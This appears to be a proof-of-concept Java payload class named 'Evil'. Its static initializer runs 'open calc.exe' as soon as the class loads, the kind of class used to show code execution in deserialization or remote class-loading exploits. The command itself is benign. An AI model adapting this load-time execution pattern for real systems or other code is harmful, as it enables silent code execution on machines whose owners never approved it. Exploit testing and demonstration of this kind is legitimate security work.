public class Evil{
    static{
        try{
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"open", "calc.exe"};
            System.out.println("success");
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e){
            System.out.println("error");
        }
    }
}